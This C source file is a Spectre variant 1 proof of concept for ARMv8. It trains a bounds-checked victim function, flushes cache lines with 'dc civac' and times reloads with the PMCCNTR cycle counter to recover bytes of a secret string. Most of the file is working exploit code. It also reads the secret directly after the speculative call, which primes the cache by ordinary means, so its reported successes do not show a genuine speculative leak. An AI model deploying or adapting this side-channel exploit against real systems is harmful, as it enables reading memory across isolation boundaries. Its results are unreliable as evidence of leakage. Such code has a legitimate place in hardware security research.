#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdint.h>
#include <inttypes.h>
#include "armv8/libflush.h"
#include "armv8/internal.h"
#include "armv8//memory.h"
#include "armv8/timing.h"
#include "internal.h"
#include "libflush.h"
#include "timing.h"

/********************************************************************
Victim code.
********************************************************************/

#define stride 256
int DELTA = 64;
int TOP_N = 10;
int CACHE_HIT_THRESHOLD = 130;
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * stride];
// char *secret = "The Magic Words are Squeamish Ossifrage.";
char *secret = "LBWNB";
volatile uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */




// Define a structure to hold both a value and its index
typedef struct {
    int value;
    int index;
} ValueIndex;

// Function to compare two ValueIndex structures (for sorting and min heap)
int compareValueIndex(const void *a, const void *b) {
    return ((ValueIndex*)a)->value - ((ValueIndex*)b)->value;
}

// Function to find the top 10 largest values and their indices
void findTop10LargestWithIndex(int arr[], int n, ValueIndex top[], int topSize) {
    if (n <= topSize) {
        // If the array has 10 or fewer elements, simply copy them
        for (int i = 0; i < n; i++) {
            top[i].value = arr[i];
            top[i].index = i;
        }
        // Sort if needed and return
        qsort(top, n, sizeof(ValueIndex), compareValueIndex);
        return;
    }

    // Initialize the first 10 elements
    for (int i = 0; i < topSize; i++) {
        top[i].value = arr[i];
        top[i].index = i;
    }

    // Create a min heap with the first 10 elements
    qsort(top, topSize, sizeof(ValueIndex), compareValueIndex);

    // Go through the rest of the array
    for (int i = topSize; i < n; i++) {
        // If the current element is larger than the smallest in the top array
        if (arr[i] > top[0].value) {
            // Replace the smallest with the current element
            top[0].value = arr[i];
            top[0].index = i;
            // Re-heapify the top array
            qsort(top, topSize, sizeof(ValueIndex), compareValueIndex);
        }
    }
}











static inline uint64_t read_pmccntr(void)
{
    uint64_t val;
	asm volatile("mrs %0, pmccntr_el0" : "=r"(val));
	return val;
}


void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * stride + DELTA];
    }
}

/********************************************************************
Analysis code
********************************************************************/

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int count)
{
    printf("\n~~~~~~~~~~~~~~Searching for the %d word~~~~~~~~~~~~~~~~\n",count);

    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2, time_diff;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
    {
        results[i] = 0;
    }

    for (tries = 1; tries > 0; tries--)
    {

        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++){
            asm volatile("dc civac, %0" : : "r"(&array2[i * stride + DELTA]) : "memory");
            asm volatile("dsb ish"); // Data synchronization barrier ensure write has completed
            asm volatile("isb"); // Insert isb for serialization after cache flush
        }
            

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */

        // training_x = tries % array1_size;
        // for (j = 29; j >= 0; j--)
        // {
        //     asm volatile("dc civac, %0" : : "r"(&array1_size) : "memory");
        //     asm volatile("isb"); // Insert isb for serialization after cache flush
        //     // for (volatile int z = 0; z < 100; z++)
        //     // {
        //     // } /* Delay (can also mfence) */

        //     /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
        //     /* Avoid jumps in case those tip off the branch predictor */
        //     x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        //     x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
        //     x = training_x ^ (x & (malicious_x ^ training_x));

        //     /* Call the victim! */
        //     victim_function(x);
        // }
        for (j = 29; j >= 0; j--)
        {
            asm volatile("dc civac, %0" : : "r"(&array1_size) : "memory");
            asm volatile("dsb ish"); // Data synchronization barrier ensure write has completed
            asm volatile("isb"); // Insert isb for serialization after cache flush
            victim_function(j % 15); // hard train
            asm volatile("dc civac, %0" : : "r"(&array1_size) : "memory");
            asm volatile("dsb ish"); // Data synchronization barrier ensure write has completed
            asm volatile("isb"); // Insert isb for serialization after cache flush
        }
        victim_function(malicious_x);
        printf("\nsecrete %d\n",*(secret + count));
        temp &= array2[*(secret + count) * stride + DELTA];

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * stride + DELTA];
            asm volatile("isb"); // Serialize before reading the counter
            //asm volatile("MRS %0, cntvct_el0" : "=r"(time1));
            time1 = read_pmccntr();
            asm volatile("isb"); // Serialize after reading the counter
            junk = *addr;        /* MEMORY ACCESS TO TIME */
            asm volatile("isb"); // Serialize before reading the counter
            //asm volatile("MRS %0, cntvct_el0" : "=r"(time2));
            time2 = read_pmccntr();
            asm volatile("isb"); // Serialize after reading the counter
            time_diff = time2 - time1;
            printf("hit time of char %d %c is %ld \n",mix_i,mix_i,time_diff);
            // if (time_diff <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]){
             if (time_diff <= CACHE_HIT_THRESHOLD && mix_i >= 33 && mix_i <= 136 && mix_i != array1[tries % array1_size]){
                // printf("IF hit time of char %d %c is %ld \n",mix_i,mix_i,time_diff);
                results[mix_i]++; /* cache hit - add +1 to score for this value */
            }
               
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        // if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
        //     break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];

    // for (int i = 0; i < 256; i++) {
    //     printf("Value: %d, Index: %d \n", results[i],i);
    // }


    // int n = sizeof(results)/sizeof(results[0]);
    // ValueIndex top[10];
    // findTop10LargestWithIndex(results, n, top, 10);

    // printf("Top 10 largest values and their indices:\n");
    // for (int i = 0; i < 10; i++) {
    //     printf("Value: %d, Index: %d\n", top[i].value ,top[i].index);
    // }
    // printf("\n");

}

int main(int argc, const char **argv)
{


    size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
    int score[2];
    int len = 5;
    int len_ref = len;
    int count;
    int i;
    uint8_t value[2];

    for (i = 0; i < 256 * stride; i++)
    {
        array2[i] = i; /* write to array2 so in RAM not copy-on-write zero pages */
    }

    if (argc == 3)
    {
        sscanf(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; /* Convert input value into a pointer */
        sscanf(argv[2], "%d", &len);
    }

    printf("Reading %d bytes:\n", len);

    while (--len >= 0)
    {
        count = len_ref - len - 1;
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        //printf("~~~~~~~~~~~~~~%d %c %d~~~~~~~~~~~~~~~\n",counter,*(secret+counter),*(secret+counter));
        readMemoryByte(malicious_x++, value, score, count);
        
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

        if (score[1] > 0){
            printf("");
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        }
       printf("\n");
    }
    return (0);
}

